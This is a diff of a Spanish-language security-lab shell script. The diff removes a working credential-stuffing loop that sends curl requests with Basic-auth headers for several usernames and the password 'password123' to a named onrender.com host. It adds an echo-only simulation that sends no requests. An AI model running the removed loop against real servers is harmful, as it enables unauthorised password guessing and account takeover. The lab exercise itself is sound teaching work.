@@ -1,21 +1,38 @@
+
 #!/bin/sh
 
-# Objetivo de la prueba en la DMZ
-TARGET="https://servidor-web-dmz-ebl.onrender.com"
-
-# Lista reducida para simular Credential Stuffing / Fuerza Bruta
+# Usuarios ficticios para la simulacion
 USUARIOS="admin root user docente gestor"
 
-echo "=== INICIANDO ATAQUE DE CREDENTIAL STUFFING / BRUTE FORCE ==="
-echo "Probando combinaciones de credenciales sobre $TARGET..."
+echo "=========================================="
+echo "MODULO 06 - SIMULACION CREDENTIAL STUFFING"
+echo "Laboratorio: Adelaida y Vannesa"
+echo "=========================================="
 
-for user in $USUARIOS; do
-  AUTH=$(echo -n "$user:password123" | base64)
-  CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Basic $AUTH" "$TARGET")
-  echo "Probando usuario [$user] con clave [password123] -> Respuesta HTTP: $CODE"
+echo ""
+echo "Analizando intentos de autenticacion ficticios..."
+echo ""
+
+TOTAL=0
+
+for usuario in $USUARIOS; do
+    TOTAL=$((TOTAL + 1))
+
+    echo "Intento simulado $TOTAL"
+    echo "Usuario de prueba: $usuario"
+    echo "Estado: INTENTO FICTICIO REGISTRADO"
+    echo ""
 done
 
-echo "=== PRUEBAS DE AUTENTICACIÓN FINALIZADAS ==="
+echo "=========================================="
+echo "ANALISIS DE SEGURIDAD"
+echo "=========================================="
 
-# Mantener activo el contenedor
-python3 -m http.server 8080
+echo "Total de intentos simulados: $TOTAL"
+echo "Patron detectado: multiples usuarios."
+echo "Alerta: posible comportamiento de Credential Stuffing."
+echo "No se enviaron credenciales ni solicitudes de acceso."
+
+echo ""
+echo "SIMULACION FINALIZADA"
+echo "=========================================="
